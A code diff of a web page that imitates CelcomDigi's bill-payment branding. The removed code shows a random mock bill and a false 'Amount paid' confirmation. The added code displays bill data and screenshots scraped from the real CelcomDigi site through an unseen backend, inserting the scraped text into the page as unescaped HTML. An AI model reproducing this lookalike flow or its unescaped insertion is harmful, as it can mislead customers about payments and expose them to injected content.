-        submitBtn.classList.remove('bg-celcom-digi-light-blue');
-        submitBtn.classList.add('bg-disabled-submit-button');
-      }
-    }
-
-    // Submit step 1
-    function submitStep1(e) {
-      e.preventDefault();
-
-      let val = '';
-      if (!useAccountMode) {
-        val = document.getElementById('mobile_number_input').value.replace(/\D/g, '');
-        if (!val || val.length < 11 || !val.startsWith('601')) {
-          document.getElementById('mobile_number_input').classList.add('border-error-message', 'border-2');
-          document.getElementById('mobile_number_input').classList.remove('border-gray-300');
-          document.getElementById('mobile-error').style.display = 'block';
+        if (!data.success) {
+          inputWrapper.classList.add('error');
+          errorMsg.textContent = data.error || 'Invalid number. Please try again.';
+          errorMsg.classList.add('visible');
           return;
         }
-      } else {
-        val = document.getElementById('account_number_input').value.trim();
-        if (!val || val.length < 8) {
-          document.getElementById('account-error').style.display = 'block';
-          return;
+
+        // Show bill result
+        displayBillResult(data, mobileNumber);
+
+      } catch (err) {
+        clearInterval(stepInterval);
+        overlay.classList.remove('visible');
+        submitBtn.disabled = false;
+        inputWrapper.classList.add('error');
+        errorMsg.textContent = 'Connection error. Please try again.';
+        errorMsg.classList.add('visible');
+      }
+    }
+
+    function displayBillResult(data, mobileNumber) {
+      const stepForm = document.getElementById('stepForm');
+      const stepResult = document.getElementById('stepResult');
+      const billContent = document.getElementById('billContent');
+
+      // Format mobile number for display
+      const displayNumber = mobileNumber.replace(/^60/, '0');
+
+      // Build bill HTML
+      let html = '';
+
+      // Bill header with amount if found
+      const amount = data.totalAmount || data.allAmounts?.[0] || null;
+      html += `
+        <div class="bill-header">
+          <div class="bill-header-top">
+            <div>
+              <div class="bill-label">Mobile Number</div>
+              <div class="bill-number">${displayNumber}</div>
+            </div>
+            <div style="text-align:right">
+              <div class="bill-label">Status</div>
+              <div style="font-size:14px;font-weight:700;color:#4ade80;">● Active</div>
+            </div>
+          </div>
+          ${amount ? `
+          <div class="bill-amount-section">
+            <div class="bill-amount-label">Total Amount Due</div>
+            <div class="bill-amount-value">${amount}</div>
+            ${data.dueDate ? `<div class="bill-due">${data.dueDate}</div>` : ''}
+          </div>
+          ` : ''}
+        </div>
+      `;
+
+      // Screenshot from real CelcomDigi page
+      if (data.screenshot) {
+        html += `
+          <div class="bill-screenshot-section">
+            <div class="bill-screenshot-label">📸 Live from CelcomDigi</div>
+            <img class="bill-screenshot" src="data:image/png;base64,${data.screenshot}" alt="Bill from CelcomDigi" />
+          </div>
+        `;
+      }
+
+      // Extracted data sections
+      if (data.rawSections && data.rawSections.length > 0) {
+        const relevantSections = data.rawSections.filter(s =>
+          s.length > 2 &&
+          !s.includes('<!') &&
+          !s.startsWith('<') &&
+          !/^(div|span|p|h[1-6]|a|button)$/i.test(s)
+        ).slice(0, 20);
+
+        if (relevantSections.length > 0) {
+          html += `
+            <div class="bill-raw-data">
+              <div class="bill-raw-title">
+                📄 Bill Information from CelcomDigi
+              </div>
+              <div class="bill-raw-content">${relevantSections.join('\n')}</div>
+            </div>
+          `;
         }
       }
 
-      currentNumber = val;
-      showLoading();
+      // Pay now button
+      html += `
+        <a href="https://get.celcomdigi.com/bill-payment/en" target="_blank" class="btn-pay">
+          💳 Pay Now on CelcomDigi
+        </a>
+      `;
 
-      setTimeout(() => {
-        hideLoading();
-        // Generate mock bill amount
-        const mockAmount = 'RM' + (Math.floor(Math.random() * 150) + 30) + '.00';
-        document.getElementById('info-account').textContent = currentNumber;
-        document.getElementById('info-name').textContent = 'CelcomDigi Customer';
-        document.getElementById('info-amount').textContent = mockAmount;
-        showPage('page2');
-      }, 1000);
+      billContent.innerHTML = html;
+
+      // Switch views
+      stepForm.style.display = 'none';
+      stepResult.classList.add('visible');
     }
 
-    // Submit payment
-    function submitPayment() {
-      showLoading();
-
-      setTimeout(() => {
-        hideLoading();
-        const amount = document.getElementById('info-amount').textContent;
-        document.getElementById('success-account').textContent = 'Account: ' + currentNumber;
-        document.getElementById('success-amount').textContent = 'Amount paid: ' + amount;
-        showPage('page3');
-      }, 1500);
-    }
-
-    // Go back
     function goBack() {
-      showPage('page1');
-    }
-
-    // Reset form
-    function resetForm() {
-      showPage('page1');
-      document.getElementById('mobile_number_input').value = '';
-      document.getElementById('account_number_input').value = '';
-      document.getElementById('mobile-error').style.display = 'none';
-      document.getElementById('account-error').style.display = 'none';
-      currentNumber = '';
-
-      const submitBtn = document.getElementById('submit_button');
-      submitBtn.disabled = true;
-      submitBtn.classList.remove('bg-celcom-digi-light-blue');
-      submitBtn.classList.add('bg-disabled-submit-button');
-
-      if (useAccountMode) {
-        useAccountMode = false;
-        document.getElementById('mobile-section').style.display = 'block';
-        document.getElementById('account-section').style.display = 'none';
-        document.getElementById('toggle-text').textContent = 'Use account number instead';
-      }
-    }
-
-    // Show/hide pages
-    function showPage(pageId) {
-      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-      document.getElementById(pageId).classList.add('active');
-      window.scrollTo(0, 0);
-    }
-
-    // Loading modal
-    function showLoading() {
-      document.getElementById('loadingBackdrop').classList.remove('hidden');
-    }
-    function hideLoading() {
-      document.getElementById('loadingBackdrop').classList.add('hidden');
+      document.getElementById('stepForm').style.display = 'block';
+      document.getElementById('stepResult').classList.remove('visible');
+      input.value = '';
+      inputWrapper.classList.remove('has-value', 'error');
+      errorMsg.classList.remove('visible');
     }
   </script>
-
 </body>
 </html>
